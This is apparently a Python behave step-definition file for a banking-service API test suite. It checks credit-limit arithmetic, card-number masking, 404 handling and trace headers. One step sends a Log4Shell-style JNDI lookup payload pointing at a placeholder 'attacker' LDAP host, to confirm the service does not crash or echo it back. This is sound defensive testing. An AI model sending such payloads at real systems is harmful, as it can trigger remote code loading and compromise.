"""Step definitions for the Java banking-service Cucumber/Gherkin suite.

These steps run with `behave` against the LIVE banking service at TARGET_API_URL
(injected by the AQE runner; defaults to http://127.0.0.1:8000). Nothing is
hardcoded — card ids are discovered at runtime from the service's own catalogue,
so the suite works against any healthy instance.

The suite proves the platform can author and execute Cucumber/.feature scripts
end-to-end and validate real banking behaviour: credit-limit movement and its
arithmetic, PAN masking, not-found handling, injection-payload safety, and
response trace headers.
"""
import os

import requests
from behave import given, when, then

BASE = os.environ.get("TARGET_API_URL", "http://127.0.0.1:8000").rstrip("/")
TIMEOUT = float(os.environ.get("JAVA_HTTP_TIMEOUT", "15"))


def _req(method, path, **kw):
    """One HTTP call. Never raises on transport error — returns a sentinel so the
    THEN steps produce a clean assertion message instead of a stack trace."""
    try:
        return requests.request(method, f"{BASE}{path}", timeout=TIMEOUT, **kw)
    except Exception as exc:  # noqa: BLE001
        return type("R", (), {"status_code": 0, "text": f"connection error: {exc}",
                              "headers": {}, "json": lambda self=None: {}})()


def _cards():
    r = _req("GET", "/api/v1/credit-cards")
    assert getattr(r, "status_code", 0) == 200, f"could not list credit cards at {BASE} (status {r.status_code})"
    return r.json().get("cards", []) or []


def _active_card():
    cards = _cards()
    active = [c for c in cards if c.get("status") == "ACTIVE"] or cards
    assert active, "the banking service returned no credit cards"
    return active[0]


# ── Reachability ────────────────────────────────────────────────────────────
@given("the banking service is reachable")
@given("the platform service is reachable")
def step_reachable(context):
    r = _req("GET", "/health")
    assert getattr(r, "status_code", 0) == 200, f"banking service not healthy at {BASE} (status {getattr(r,'status_code',0)})"
    context.base = BASE


@then("the service reports it is healthy")
def step_healthy(context):
    assert _req("GET", "/health").status_code == 200, "health endpoint did not return 200"


# ── Credit-limit movement ─────────────────────────────────────────────────────
@given("an active credit card")
def step_active_card(context):
    c = _active_card()
    context.card_id = c["_id"]
    context.prev_limit = float(c["credit_limit"])


def _apply_delta(context, delta):
    if not getattr(context, "card_id", None):
        c = _active_card(); context.card_id = c["_id"]; context.prev_limit = float(c["credit_limit"])
    context.applied_delta = float(delta)
    context.resp = _req("POST", f"/api/v1/credit-cards/{context.card_id}/limit-increase",
                        json={"delta_amount": delta})


@when("I increase the credit limit by {amount:d}")
def step_increase(context, amount):
    _apply_delta(context, amount)


@when("I decrease the credit limit by {amount:d}")
def step_decrease(context, amount):
    _apply_delta(context, -amount)


@then("the request succeeds")
def step_success(context):
    sc = getattr(context.resp, "status_code", 0)
    assert 200 <= sc < 300, f"expected a 2xx response, got {sc}: {context.resp.text[:200]}"


@then("the new credit limit reflects the change")
def step_math(context):
    body = context.resp.json()
    new = float(body["new_limit"]); prev = float(body["previous_limit"])
    expected = prev + context.applied_delta
    assert abs(new - expected) < 0.01, f"limit arithmetic wrong: {prev} + {context.applied_delta} should be {expected}, got {new}"


# ── Card portfolio / masking ──────────────────────────────────────────────────
@when("I list the credit cards")
def step_list(context):
    context.resp = _req("GET", "/api/v1/credit-cards")


@then("at least one credit card is returned")
def step_have_cards(context):
    cards = context.resp.json().get("cards", [])
    assert len(cards) >= 1, "no credit cards returned"
    context.cards = cards


@then("every card number is masked")
def step_masked(context):
    cards = getattr(context, "cards", None) or context.resp.json().get("cards", [])
    bad = [c for c in cards if "XXXX" not in (c.get("card_number_masked") or "")]
    assert not bad, f"{len(bad)} card(s) expose an unmasked PAN"


@given("an existing credit card")
def step_existing_card(context):
    context.card_id = _active_card()["_id"]


@when("I fetch the card's full details")
def step_details(context):
    if not getattr(context, "card_id", None):
        context.card_id = _active_card()["_id"]
    context.resp = _req("GET", f"/api/v1/credit-cards/{context.card_id}/full-details")


@then("the balance fields are present")
def step_balance_fields(context):
    body = context.resp.json()
    for f in ("credit_limit", "available_credit", "current_balance"):
        assert f in body, f"full-details is missing the '{f}' field"


@then("the card number is masked in the response")
def step_details_masked(context):
    masked = context.resp.json().get("card_number_masked", "")
    assert "XXXX" in masked, f"PAN not masked in full-details: {masked!r}"


# ── Not-found handling ────────────────────────────────────────────────────────
@when("I fetch details for a non-existent card")
def step_bad_card(context):
    context.resp = _req("GET", "/api/v1/credit-cards/000000000000000000000000/full-details")


@then("the service returns a not-found error")
def step_not_found(context):
    sc = getattr(context.resp, "status_code", 0)
    assert sc == 404, f"expected 404 for an unknown card, got {sc}"


# ── Injection-payload safety ──────────────────────────────────────────────────
@when("I submit a limit change carrying an injection payload")
def step_injection(context):
    context.payload = "${jndi:ldap://attacker/a}"
    cid = _active_card()["_id"]
    context.resp = _req("POST", f"/api/v1/credit-cards/{cid}/limit-increase",
                        json={"delta_amount": 100, "reason": context.payload, "note": context.payload})


@then("the service does not return a server error")
def step_no_500(context):
    sc = getattr(context.resp, "status_code", 0)
    assert sc != 500 and sc != 0, f"service errored on the injection payload (status {sc})"


@then("the payload is not reflected in the response")
def step_not_reflected(context):
    body = getattr(context.resp, "text", "") or ""
    assert context.payload not in body and "jndi:" not in body.lower(), "the injection payload was reflected in the response"


# ── Transport / trace ─────────────────────────────────────────────────────────
@when("I read the health endpoint")
def step_read_health(context):
    context.resp = _req("GET", "/health")


@then("the response carries a request trace header")
def step_trace(context):
    headers = {k.lower(): v for k, v in dict(getattr(context.resp, "headers", {})).items()}
    assert "x-trace-id" in headers, f"no request-trace header present; got headers: {list(headers)}"
